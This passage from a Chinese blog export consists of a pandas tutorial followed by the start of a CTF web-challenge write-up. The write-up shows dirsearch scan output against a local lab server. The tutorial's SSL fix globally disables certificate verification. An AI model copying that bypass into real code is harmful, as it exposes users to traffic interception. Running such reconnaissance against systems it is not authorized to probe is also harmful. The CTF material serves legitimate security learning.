<li>使用series.sort_index()进行排序<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 对索引进行排序</span></span><br><span class="line">data[<span class="string">&#x27;p_change&#x27;</span>].sort_index().head()</span><br><span class="line"></span><br><span class="line"><span class="number">2015</span>-03-02    <span class="number">2.62</span></span><br><span class="line"><span class="number">2015</span>-03-03    <span class="number">1.44</span></span><br><span class="line"><span class="number">2015</span>-03-04    <span class="number">1.57</span></span><br><span class="line"><span class="number">2015</span>-03-05    <span class="number">2.02</span></span><br><span class="line"><span class="number">2015</span>-03-06    <span class="number">8.51</span></span><br><span class="line">Name: p_change, dtype: float64</span><br></pre></td></tr></table></figure></li>
</ul>
<h1 id="4-DataFrame-运算"><a href="#4-DataFrame-运算" class="headerlink" title="4 | DataFrame 运算"></a>4 | DataFrame 运算</h1><h2 id="4-1-算数运算"><a href="#4-1-算数运算" class="headerlink" title="4.1 算数运算"></a>4.1 算数运算</h2><ul>
<li>add(n)</li>
<li>sub(n)<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data[<span class="string">&#x27;open&#x27;</span>].add(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="number">2018</span>-02-<span class="number">27</span>    <span class="number">24.53</span></span><br><span class="line"><span class="number">2018</span>-02-<span class="number">26</span>    <span class="number">23.80</span></span><br><span class="line"><span class="number">2018</span>-02-<span class="number">23</span>    <span class="number">23.88</span></span><br><span class="line"><span class="number">2018</span>-02-<span class="number">22</span>    <span class="number">23.25</span></span><br><span class="line"><span class="number">2018</span>-02-<span class="number">14</span>    <span class="number">22.49</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="4-2-逻辑运算"><a href="#4-2-逻辑运算" class="headerlink" title="4.2 逻辑运算"></a>4.2 逻辑运算</h2><ol>
<li>逻辑运算符<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data[<span class="string">&quot;open&quot;</span>] &gt; <span class="number">23</span></span><br><span class="line"></span><br><span class="line"><span class="number">2018</span>-02-<span class="number">27</span>     <span class="literal">True</span></span><br><span class="line"><span class="number">2018</span>-02-<span class="number">26</span>    <span class="literal">False</span></span><br><span class="line"><span class="number">2018</span>-02-<span class="number">23</span>    <span class="literal">False</span></span><br><span class="line"><span class="number">2018</span>-02-<span class="number">22</span>    <span class="literal">False</span></span><br><span class="line"><span class="number">2018</span>-02-<span class="number">14</span>    <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 逻辑判断的结果可以作为筛选的依据</span></span><br><span class="line">data[data[<span class="string">&quot;open&quot;</span>] &gt; <span class="number">23</span>].head()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 完成多个逻辑</span></span><br><span class="line">data[(data[<span class="string">&quot;open&quot;</span>] &gt; <span class="number">23</span>) &amp; (data[<span class="string">&quot;open&quot;</span>] &lt; <span class="number">24</span>)].head()</span><br></pre></td></tr></table></figure></li>
<li>逻辑运算函数</li>
</ol>
<ul>
<li>query(expr)<ul>
<li>expr:查询字符串<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 完成多个逻辑</span></span><br><span class="line">data[(data[<span class="string">&quot;open&quot;</span>] &gt; <span class="number">23</span>) &amp; (data[<span class="string">&quot;open&quot;</span>] &lt; <span class="number">24</span>)].head()</span><br><span class="line"></span><br><span class="line">data.query(<span class="string">&quot;open&lt;24 &amp; open&gt;23&quot;</span>).head()</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li>isin(values)<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 可以指定值进行一个判断，从而进行筛选操作</span></span><br><span class="line">data[data[<span class="string">&quot;open&quot;</span>].isin([<span class="number">23.53</span>, <span class="number">23.85</span>])]</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="4-3-统计运算"><a href="#4-3-统计运算" class="headerlink" title="4.3 统计运算"></a>4.3 统计运算</h2><ol>
<li><p>describe<br>综合分析: 能够直接得出很多统计结果,count, mean, std, min, max 等</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 计算平均值、标准差、最大值、最小值</span></span><br><span class="line">data.describe()</span><br></pre></td></tr></table></figure></li>
<li><p>统计函数</p>
<table>
<thead>
<tr>
<th>count</th>
<th>Number of non-NA observations</th>
</tr>
</thead>
<tbody><tr>
<td>sum</td>
<td>Sum of values</td>
</tr>
<tr>
<td>mean</td>
<td>Mean of values</td>
</tr>
<tr>
<td>median</td>
<td>Arithmetic median of values 中位数</td>
</tr>
<tr>
<td>min</td>
<td>Minimum</td>
</tr>
<tr>
<td>max</td>
<td>Maximum</td>
</tr>
<tr>
<td>mode</td>
<td>Mode</td>
</tr>
<tr>
<td>abs</td>
<td>Absolute Value</td>
</tr>
<tr>
<td>prod</td>
<td>Product of values</td>
</tr>
<tr>
<td>std</td>
<td>Bessel-corrected sample standard deviation 标准差</td>
</tr>
<tr>
<td>var</td>
<td>Unbiased variance 方差</td>
</tr>
<tr>
<td>idxmax</td>
<td>compute the index labels with the maximum 最大值的索引</td>
</tr>
<tr>
<td>idxmin</td>
<td>compute the index labels with the minimum 最小值的索引</td>
</tr>
</tbody></table>
<blockquote>
<p><strong>对于单个函数去进行统计的时候，坐标轴还是按照默认列“columns” (axis=0, default)，如果要对行“index” 需要指定(axis=1)</strong></p>
</blockquote>
</li>
<li><p>累计统计函数</p>
<table>
<thead>
<tr>
<th>函数</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td>cumsum</td>
<td>计算前 n 个数的和</td>
</tr>
<tr>
<td>cummax</td>
<td>计算前 n 个数的最大值</td>
</tr>
<tr>
<td>cummin</td>
<td>计算前 n 个数的最小值</td>
</tr>
<tr>
<td>cumprod</td>
<td>计算前 n 个数的积</td>
</tr>
</tbody></table>
</li>
</ol>
<h2 id="4-4-自定义运算"><a href="#4-4-自定义运算" class="headerlink" title="4.4 自定义运算"></a>4.4 自定义运算</h2><ul>
<li>apply(func, axis=0)<ul>
<li>func:自定义函数</li>
<li>axis=0:默认是列，axis=1为行进行运算</li>
</ul>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 定义一个对列，最大值-最小值的函数</span></span><br><span class="line">data[[<span class="string">&#x27;open&#x27;</span>, <span class="string">&#x27;close&#x27;</span>]].apply(<span class="keyword">lambda</span> x: x.<span class="built_in">max</span>() - x.<span class="built_in">min</span>(), axis=<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">open</span>     <span class="number">22.74</span></span><br><span class="line">close    <span class="number">22.85</span></span><br><span class="line">dtype: float64</span><br></pre></td></tr></table></figure>

<h1 id="5-画图"><a href="#5-画图" class="headerlink" title="5 | 画图"></a>5 | 画图</h1><ol>
<li><p>pandas.DataFrame.plot</p>
<blockquote>
<p><a href="https://pandas.pydata.org/pandas-docs/stable/reference/api/pandas.DataFrame.plot.html">https://pandas.pydata.org/pandas-docs/stable/reference/api/pandas.DataFrame.plot.html</a></p>
</blockquote>
</li>
<li><p>pandas.Series.plot</p>
<blockquote>
<p><a href="https://pandas.pydata.org/pandas-docs/stable/reference/api/pandas.Series.plot.html">https://pandas.pydata.org/pandas-docs/stable/reference/api/pandas.Series.plot.html</a></p>
</blockquote>
</li>
</ol>
<h1 id="6-文件读取与存储"><a href="#6-文件读取与存储" class="headerlink" title="6 | 文件读取与存储"></a>6 | 文件读取与存储</h1><p><img src="https://cdn.jsdelivr.net/gh/cs-cshi/image-host/pandas/%E8%AF%BB%E5%8F%96%E5%AD%98%E5%82%A8.png" alt="读取存储"></p>
<h2 id="6-1-CSV"><a href="#6-1-CSV" class="headerlink" title="6.1 CSV"></a>6.1 CSV</h2><ul>
<li>pandas.read_csv(filepath_or_buffer, sep =’,’, usecols )<ul>
<li>filepath_or_buffer:文件路径</li>
<li>sep :分隔符，默认用”,”隔开</li>
<li>usecols:指定读取的列名，列表形式<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 读取文件,并且指定只获取&#x27;open&#x27;, &#x27;close&#x27;指标</span></span><br><span class="line">data = pd.read_csv(<span class="string">&quot;./data/stock_day.csv&quot;</span>, usecols=[<span class="string">&#x27;open&#x27;</span>, <span class="string">&#x27;close&#x27;</span>])</span><br><span class="line"></span><br><span class="line">            <span class="built_in">open</span>    close</span><br><span class="line"><span class="number">2018</span>-02-<span class="number">27</span>    <span class="number">23.53</span>    <span class="number">24.16</span></span><br><span class="line"><span class="number">2018</span>-02-<span class="number">26</span>    <span class="number">22.80</span>    <span class="number">23.53</span></span><br><span class="line"><span class="number">2018</span>-02-<span class="number">23</span>    <span class="number">22.88</span>    <span class="number">22.82</span></span><br><span class="line"><span class="number">2018</span>-02-<span class="number">22</span>    <span class="number">22.25</span>    <span class="number">22.28</span></span><br><span class="line"><span class="number">2018</span>-02-<span class="number">14</span>    <span class="number">21.49</span>    <span class="number">21.92</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li>DataFrame.to_csv(path_or_buf=None, sep=’, ’, columns=None, header=True, index=True, mode=’w’, encoding=None)<ul>
<li>path_or_buf :文件路径</li>
<li>sep :分隔符，默认用”,”隔开</li>
<li>columns :选择需要的列索引</li>
<li>header :boolean or list of string, default True,是否写进列索引值</li>
<li>index:是否写进行索引</li>
<li>mode:’w’：重写, ‘a’ 追加<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 选取10行数据保存,便于观察数据</span></span><br><span class="line">data[:<span class="number">10</span>].to_csv(<span class="string">&quot;./data/test.csv&quot;</span>, columns=[<span class="string">&#x27;open&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 结果</span></span><br><span class="line">     Unnamed: <span class="number">0</span>    <span class="built_in">open</span></span><br><span class="line"><span class="number">0</span>    <span class="number">2018</span>-02-<span class="number">27</span>    <span class="number">23.53</span></span><br><span class="line"><span class="number">1</span>    <span class="number">2018</span>-02-<span class="number">26</span>    <span class="number">22.80</span></span><br><span class="line"><span class="number">2</span>    <span class="number">2018</span>-02-<span class="number">23</span>    <span class="number">22.88</span></span><br><span class="line"><span class="number">3</span>    <span class="number">2018</span>-02-<span class="number">22</span>    <span class="number">22.25</span></span><br><span class="line"><span class="number">4</span>    <span class="number">2018</span>-02-<span class="number">14</span>    <span class="number">21.49</span></span><br><span class="line"><span class="number">5</span>    <span class="number">2018</span>-02-<span class="number">13</span>    <span class="number">21.40</span></span><br><span class="line"><span class="number">6</span>    <span class="number">2018</span>-02-<span class="number">12</span>    <span class="number">20.70</span></span><br><span class="line"><span class="number">7</span>    <span class="number">2018</span>-02-09    <span class="number">21.20</span></span><br><span class="line"><span class="number">8</span>    <span class="number">2018</span>-02-08    <span class="number">21.79</span></span><br><span class="line"><span class="number">9</span>    <span class="number">2018</span>-02-07    <span class="number">22.69</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># index:存储不会讲索引值变成一列数据</span></span><br><span class="line">data[:<span class="number">10</span>].to_csv(<span class="string">&quot;./data/test.csv&quot;</span>, columns=[<span class="string">&#x27;open&#x27;</span>], index=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<h2 id="6-2-HDF5"><a href="#6-2-HDF5" class="headerlink" title="6.2 HDF5"></a>6.2 HDF5</h2><ul>
<li>HDF5在存储的时候支持压缩，使用的方式是blosc，这个是速度最快的也是pandas默认支持的</li>
<li>使用压缩可以提磁盘利用率，节省空间</li>
<li>HDF5还是跨平台的，可以轻松迁移到hadoop 上面</li>
</ul>
<p>HDF5文件的读取和存储需要指定一个键，值为要存储的DataFrame</p>
<ul>
<li>pandas.read_hdf(path_or_buf，key =None，** kwargs)<ul>
<li>path_or_buffer:文件路径</li>
<li>key:读取的键<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 读 HDF5 文件需要 tables 模块</span></span><br><span class="line">day_close = pd.read_hdf(<span class="string">&quot;./data/day_close.h5&quot;</span>)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li>DataFrame.to_hdf(path_or_buf, key, <em>\kwargs</em>)<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">day_close.to_hdf(<span class="string">&quot;./data/test.h5&quot;</span>, key=<span class="string">&quot;day_close&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 再次读取的时候, 需要指定键的名字</span></span><br><span class="line">new_close = pd.read_hdf(<span class="string">&quot;./data/test.h5&quot;</span>, key=<span class="string">&quot;day_close&quot;</span>)</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="6-3-JSON"><a href="#6-3-JSON" class="headerlink" title="6.3 JSON"></a>6.3 JSON</h2><ul>
<li><p>pandas.read_json(path_or_buf=None, orient=None, typ=’frame’, lines=False)</p>
<ul>
<li>将JSON格式准换成默认的Pandas DataFrame格式</li>
<li>orient : string,Indication of expected JSON string format.<ul>
<li>‘split’ : dict like {index -&gt; [index], columns -&gt; [columns], data -&gt; [values]}<ul>
<li>split 将索引总结到索引，列名到列名，数据到数据。将三部分都分开了</li>
</ul>
</li>
<li>‘records’ : list like [{column -&gt; value}, … , {column -&gt; value}]<ul>
<li>records 以columns：values的形式输出</li>
</ul>
</li>
<li>‘index’ : dict like {index -&gt; {column -&gt; value}}<ul>
<li>index 以index：{columns：values}…的形式输出</li>
</ul>
</li>
<li>‘columns’ : dict like {column -&gt; {index -&gt; value}},默认该格式<ul>
<li>colums 以columns:{index:values}的形式输出</li>
</ul>
</li>
<li>‘values’ : just the values array<ul>
<li>values 直接输出值</li>
</ul>
</li>
</ul>
</li>
<li>lines : boolean, default False<ul>
<li>按照每行读取json对象</li>
</ul>
</li>
<li>typ : default ‘frame’， 指定转换成的对象类型series或者dataframe</li>
</ul>
</li>
<li><p>DataFrame.to_json(path_or_buf=None, orient=None, lines=False)</p>
<ul>
<li>将Pandas 对象存储为json格式</li>
<li>path_or_buf=None：文件地址</li>
<li>orient:存储的json形式，{‘split’,’records’,’index’,’columns’,’values’}</li>
<li>lines:一个对象存储为一行</li>
</ul>
</li>
</ul>
<h1 id="7-缺失值处理"><a href="#7-缺失值处理" class="headerlink" title="7 | 缺失值处理"></a>7 | 缺失值处理</h1><ul>
<li>获取缺失值的标记方式(NaN或者其他标记方式)</li>
<li>如果缺失值的标记方式是NaN<ul>
<li>判断数据中是否包含NaN：<ul>
<li>pd.isnull(df),</li>
<li>pd.notnull(df)</li>
</ul>
</li>
<li>存在缺失值Nan:<ol>
<li>删除存在缺失值的:dropna(axis=’rows’)<ul>
<li>注：不会修改原数据，需要接受返回值</li>
</ul>
</li>
<li>替换缺失值:fillna(value, inplace=True)<ul>
<li>value:替换成的值</li>
<li>inplace:True:会修改原数据，False:不替换修改原数据，生成新的对象</li>
</ul>
</li>
</ol>
</li>
</ul>
</li>
<li>如果缺失值没有使用NaN标记，比如使用”？”<ul>
<li>先替换‘?’为np.nan，然后继续处理</li>
</ul>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 替换所有缺失值</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> movie.columns:</span><br><span class="line">    <span class="keyword">if</span> np.<span class="built_in">all</span>(pd.notnull(movie[i])) == <span class="literal">False</span>:</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">        movie[i].fillna(movie[i].mean(), inplace=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>

<p>若在读取数据时，报 SSL error 错误，解决办法:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># URLError: &lt;urlopen error [SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:833)&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 全局取消证书验证</span></span><br><span class="line"><span class="keyword">import</span> ssl</span><br><span class="line">ssl._create_default_https_context = ssl._create_unverified_context</span><br></pre></td></tr></table></figure>

<h1 id="8-数据离散化"><a href="#8-数据离散化" class="headerlink" title="8 | 数据离散化"></a>8 | 数据离散化</h1><ul>
<li><p>数据离散化</p>
<ul>
<li>可以用来减少给定连续属性值的个数</li>
<li>在连续属性的值域上，将值域划分为若干个离散的区间，最后用不同的符号或整数值代表落在每个子区间中的属性值。</li>
</ul>
</li>
<li><p>数据分组</p>
<ul>
<li>pd.qcut(data, q)：<ul>
<li>对数据进行分组将数据分组，一般会与value_counts搭配使用，统计每组的个数</li>
<li>series.value_counts()：统计分组次数<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 自行分组</span></span><br><span class="line">qcut = pd.qcut(p_change, <span class="number">10</span>)</span><br><span class="line"><span class="comment"># 计算分到每个组数据个数</span></span><br><span class="line">qcut.value_counts()</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li>pd.cut(data, bins)<ul>
<li>自定义分组区间<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 自己指定分组区间</span></span><br><span class="line">bins = [-<span class="number">100</span>, -<span class="number">7</span>, -<span class="number">5</span>, -<span class="number">3</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">100</span>]</span><br><span class="line">p_counts = pd.cut(p_change, bins)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
</li>
<li><p>one-hot 热编码<br><img src="https://cdn.jsdelivr.net/gh/cs-cshi/image-host/pandas/one_hot%E7%BC%96%E7%A0%81.png" alt="one_hot编码"></p>
<ul>
<li>pandas.get_dummies(data, prefix=None)<ul>
<li>data:array-like, Series, or DataFrame</li>
<li>prefix:分组名字<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 得出one-hot编码矩阵</span></span><br><span class="line">dummies = pd.get_dummies(p_counts, prefix=<span class="string">&quot;rise&quot;</span>)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
</li>
</ul>
<h1 id="9-合并"><a href="#9-合并" class="headerlink" title="9 | 合并"></a>9 | 合并</h1><ul>
<li>pd.concat([data1, data2], axis=1)<ul>
<li>按照行或列进行合并,axis=0为列索引，axis=1为行索引</li>
</ul>
</li>
<li>pd.merge(left, right, how=’inner’, on=None)<ul>
<li>可以指定按照两组数据的共同键值对合并或者左右各自合并</li>
<li>left: DataFrame</li>
<li>right: 另一个DataFrame</li>
<li>on: 指定的共同键</li>
<li>how:按照什么方式连接</li>
</ul>
</li>
</ul>
<table>
<thead>
<tr>
<th>Merge method</th>
<th>SQL Join Name</th>
<th>Description</th>
</tr>
</thead>
<tbody><tr>
<td>left</td>
<td>LEFT OUTER JOIN</td>
<td>Use keys from left frame only</td>
</tr>
<tr>
<td>right</td>
<td>RIGHT OUTER JOIN</td>
<td>Use keys from right frame only</td>
</tr>
<tr>
<td>outer</td>
<td>FULL OUTER JOIN</td>
<td>Use union of keys from both frames</td>
</tr>
<tr>
<td>inner</td>
<td>INNER JOIN</td>
<td>Use intersection of keys from both frames</td>
</tr>
</tbody></table>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">left = pd.DataFrame(&#123;<span class="string">&#x27;key1&#x27;</span>: [<span class="string">&#x27;K0&#x27;</span>, <span class="string">&#x27;K0&#x27;</span>, <span class="string">&#x27;K1&#x27;</span>, <span class="string">&#x27;K2&#x27;</span>],</span><br><span class="line">                        <span class="string">&#x27;key2&#x27;</span>: [<span class="string">&#x27;K0&#x27;</span>, <span class="string">&#x27;K1&#x27;</span>, <span class="string">&#x27;K0&#x27;</span>, <span class="string">&#x27;K1&#x27;</span>],</span><br><span class="line">                        <span class="string">&#x27;A&#x27;</span>: [<span class="string">&#x27;A0&#x27;</span>, <span class="string">&#x27;A1&#x27;</span>, <span class="string">&#x27;A2&#x27;</span>, <span class="string">&#x27;A3&#x27;</span>],</span><br><span class="line">                        <span class="string">&#x27;B&#x27;</span>: [<span class="string">&#x27;B0&#x27;</span>, <span class="string">&#x27;B1&#x27;</span>, <span class="string">&#x27;B2&#x27;</span>, <span class="string">&#x27;B3&#x27;</span>]&#125;)</span><br><span class="line"></span><br><span class="line">right = pd.DataFrame(&#123;<span class="string">&#x27;key1&#x27;</span>: [<span class="string">&#x27;K0&#x27;</span>, <span class="string">&#x27;K1&#x27;</span>, <span class="string">&#x27;K1&#x27;</span>, <span class="string">&#x27;K2&#x27;</span>],</span><br><span class="line">                        <span class="string">&#x27;key2&#x27;</span>: [<span class="string">&#x27;K0&#x27;</span>, <span class="string">&#x27;K0&#x27;</span>, <span class="string">&#x27;K0&#x27;</span>, <span class="string">&#x27;K0&#x27;</span>],</span><br><span class="line">                        <span class="string">&#x27;C&#x27;</span>: [<span class="string">&#x27;C0&#x27;</span>, <span class="string">&#x27;C1&#x27;</span>, <span class="string">&#x27;C2&#x27;</span>, <span class="string">&#x27;C3&#x27;</span>],</span><br><span class="line">                        <span class="string">&#x27;D&#x27;</span>: [<span class="string">&#x27;D0&#x27;</span>, <span class="string">&#x27;D1&#x27;</span>, <span class="string">&#x27;D2&#x27;</span>, <span class="string">&#x27;D3&#x27;</span>]&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 默认内连接</span></span><br><span class="line">result = pd.merge(left, right, on=[<span class="string">&#x27;key1&#x27;</span>, <span class="string">&#x27;key2&#x27;</span>])</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.jsdelivr.net/gh/cs-cshi/image-host/pandas/%E5%86%85%E8%BF%9E%E6%8E%A5.png" alt="内连接"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 左连接</span></span><br><span class="line">result = pd.merge(left, right, how=<span class="string">&#x27;left&#x27;</span>, on=[<span class="string">&#x27;key1&#x27;</span>, <span class="string">&#x27;key2&#x27;</span>])</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.jsdelivr.net/gh/cs-cshi/image-host/pandas/%E5%B7%A6%E8%BF%9E%E6%8E%A5.png" alt="左连接"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 左连接</span></span><br><span class="line">result = pd.merge(left, right, how=<span class="string">&#x27;right&#x27;</span>, on=[<span class="string">&#x27;key1&#x27;</span>, <span class="string">&#x27;key2&#x27;</span>])</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.jsdelivr.net/gh/cs-cshi/image-host/pandas/%E5%8F%B3%E8%BF%9E%E6%8E%A5.png" alt="右连接"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 左连接</span></span><br><span class="line">result = pd.merge(left, right, how=<span class="string">&#x27;outer&#x27;</span>, on=[<span class="string">&#x27;key1&#x27;</span>, <span class="string">&#x27;key2&#x27;</span>])</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.jsdelivr.net/gh/cs-cshi/image-host/pandas/%E5%A4%96%E9%93%BE%E6%8E%A5.png" alt="外连接"></p>
<h1 id="10-交叉表与透视表"><a href="#10-交叉表与透视表" class="headerlink" title="10 | 交叉表与透视表"></a>10 | 交叉表与透视表</h1><h1 id="11-分组与聚合"><a href="#11-分组与聚合" class="headerlink" title="11 | 分组与聚合"></a>11 | 分组与聚合</h1><p>分组与聚合原理<br><img src="https://cdn.jsdelivr.net/gh/cs-cshi/image-host/pandas/%E5%88%86%E7%BB%84%E8%81%9A%E5%90%88%E5%8E%9F%E7%90%86.png" alt="分组聚合原理"></p>
<ul>
<li>DataFrame.groupby(key, as_index=False)<ul>
<li>key:分组的列数据，可以多个</li>
</ul>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">col =pd.DataFrame(&#123;<span class="string">&#x27;color&#x27;</span>: [<span class="string">&#x27;white&#x27;</span>,<span class="string">&#x27;red&#x27;</span>,<span class="string">&#x27;green&#x27;</span>,<span class="string">&#x27;red&#x27;</span>,<span class="string">&#x27;green&#x27;</span>], <span class="string">&#x27;object&#x27;</span>: [<span class="string">&#x27;pen&#x27;</span>,<span class="string">&#x27;pencil&#x27;</span>,<span class="string">&#x27;pencil&#x27;</span>,<span class="string">&#x27;ashtray&#x27;</span>,<span class="string">&#x27;pen&#x27;</span>],<span class="string">&#x27;price1&#x27;</span>:[<span class="number">5.56</span>,<span class="number">4.20</span>,<span class="number">1.30</span>,<span class="number">0.56</span>,<span class="number">2.75</span>],<span class="string">&#x27;price2&#x27;</span>:[<span class="number">4.75</span>,<span class="number">4.12</span>,<span class="number">1.60</span>,<span class="number">0.75</span>,<span class="number">3.15</span>]&#125;)</span><br><span class="line"></span><br><span class="line">color    <span class="built_in">object</span>    price1    price2</span><br><span class="line"><span class="number">0</span>    white    pen    <span class="number">5.56</span>    <span class="number">4.75</span></span><br><span class="line"><span class="number">1</span>    red    pencil    <span class="number">4.20</span>    <span class="number">4.12</span></span><br><span class="line"><span class="number">2</span>    green    pencil    <span class="number">1.30</span>    <span class="number">1.60</span></span><br><span class="line"><span class="number">3</span>    red    ashtray    <span class="number">0.56</span>    <span class="number">0.75</span></span><br><span class="line"><span class="number">4</span>    green    pen    <span class="number">2.75</span>    <span class="number">3.15</span></span><br></pre></td></tr></table></figure>

<p>进行分组，对颜色分组，price进行聚合</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 分组，求平均值</span></span><br><span class="line">col.groupby([<span class="string">&#x27;color&#x27;</span>])[<span class="string">&#x27;price1&#x27;</span>].mean()</span><br><span class="line">col[<span class="string">&#x27;price1&#x27;</span>].groupby(col[<span class="string">&#x27;color&#x27;</span>]).mean()</span><br><span class="line"></span><br><span class="line">color</span><br><span class="line">green    <span class="number">2.025</span></span><br><span class="line">red      <span class="number">2.380</span></span><br><span class="line">white    <span class="number">5.560</span></span><br><span class="line">Name: price1, dtype: float64</span><br><span class="line"></span><br><span class="line"><span class="comment"># 分组，数据的结构不变</span></span><br><span class="line">col.groupby([<span class="string">&#x27;color&#x27;</span>], as_index=<span class="literal">False</span>)[<span class="string">&#x27;price1&#x27;</span>].mean()</span><br><span class="line"></span><br><span class="line">color    price1</span><br><span class="line"><span class="number">0</span>    green    <span class="number">2.025</span></span><br><span class="line"><span class="number">1</span>    red    <span class="number">2.380</span></span><br><span class="line"><span class="number">2</span>    white    <span class="number">5.560</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>编程语言</category>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>《从0到1：CTFer成长之路》配套题目</title>
    <url>/%E3%80%8A%E4%BB%8E0%E5%88%B01%EF%BC%9ACTFer%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%E3%80%8B%E9%85%8D%E5%A5%97%E9%A2%98%E7%9B%AE/</url>
    <content><![CDATA[<p>官方平台网址：<a href="https://book.nu1l.com/tasks/">https://book.nu1l.com/tasks/</a></p>
<span id="more"></span>

<h1 id="第一章-Web-入门"><a href="#第一章-Web-入门" class="headerlink" title="第一章 Web 入门"></a>第一章 Web 入门</h1><h2 id="1-1-信息搜集"><a href="#1-1-信息搜集" class="headerlink" title="1.1 信息搜集"></a>1.1 信息搜集</h2><h3 id="1-1-1-常见的搜集"><a href="#1-1-1-常见的搜集" class="headerlink" title="1.1.1 常见的搜集"></a>1.1.1 常见的搜集</h3><ol>
<li>先使用目录扫描工具 <a href="https://github.com/maurosoria/dirsearch">dirsearch</a> 扫描<code>127.0.0.1</code>网站，获得网站目录<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">200    10KB  http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.DS_Store</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.ht_wsr.txt</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.htaccessBAK</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.htaccess.bak1</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.htaccessOLD</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.htaccess.orig</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.htaccess.sample</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.htaccess.save</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.htaccess_extra</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.htaccess_orig</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.htaccess_sc</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.htm</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.html</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.htpasswd_test</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.htpasswds</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.httr-oauth</span><br><span class="line">200    12KB  http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.index.php.swp</span><br><span class="line">403   274B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;.htaccessOLD2</span><br><span class="line">200     2KB  http:&#x2F;&#x2F;127.0.0.1:80&#x2F;index.php</span><br><span class="line">200     2KB  http:&#x2F;&#x2F;127.0.0.1:80&#x2F;index.php&#x2F;login&#x2F;</span><br><span class="line">200     2KB  http:&#x2F;&#x2F;127.0.0.1:80&#x2F;index.php~</span><br><span class="line">200    47B   http:&#x2F;&#x2F;127.0.0.1:80&#x2F;robots.txt</span><br><span class="line">403   274B   